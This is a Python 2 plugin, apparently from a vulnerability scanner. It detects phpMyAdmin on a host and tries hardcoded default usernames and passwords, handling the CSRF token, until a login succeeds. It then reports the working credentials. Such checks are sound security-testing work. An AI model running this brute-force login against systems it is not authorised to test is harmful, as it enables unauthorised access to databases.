# coding=utf-8
import urllib2
import re
from config import is_port_open, is_http


@is_port_open
def verify(ip, port=80, name=None, timeout=10):
    if is_http(ip, int(port)) is False:
        return

    flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">',
                 'class="disableAjax" title=']
    user_list = ['root', 'mysql', 'www', 'bbs', 'wwwroot', 'bak', 'backup']
    PASSWORD_DIC = ['root', 'mysql', 'www', 'bbs', 'admin', '1234root', 'wwwroot', 'backup']
    error_i = 0
    try:
        res_html = urllib2.urlopen('http://' + ip + ":" + str(port), timeout=timeout).read()
        if 'input_password' in res_html and 'name="token"' in res_html:
            url = 'http://' + ip + ":" + str(port) + "/index.php"
        else:
            res_html = urllib2.urlopen('http://' + ip + ":" + str(port) + "/phpmyadmin", timeout=timeout).read()
            if 'input_password' in res_html and 'name="token"' in res_html:
                url = 'http://' + ip + ":" + str(port) + "/phpmyadmin/index.php"
            else:
                return
    except:
        pass
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
                res_html = opener.open(url, timeout=timeout).read()
                token = re.search('name="token" value="(.*?)" />', res_html)
                token_hash = urllib2.quote(token.group(1))
                postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                user, password, token_hash)
                res = opener.open(url,postdata, timeout=timeout)
                res_html = res.read()
                for flag in flag_list:
                    if flag in res_html:
                        info = {
                            "url": url,
                            "vuln_name": "phpmyadmin weak password",
                            "severity": "high",
                            "proof": "username={}&password={}".format(user, password)
                        }
                        return info
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3: return
            except Exception,e:
                return
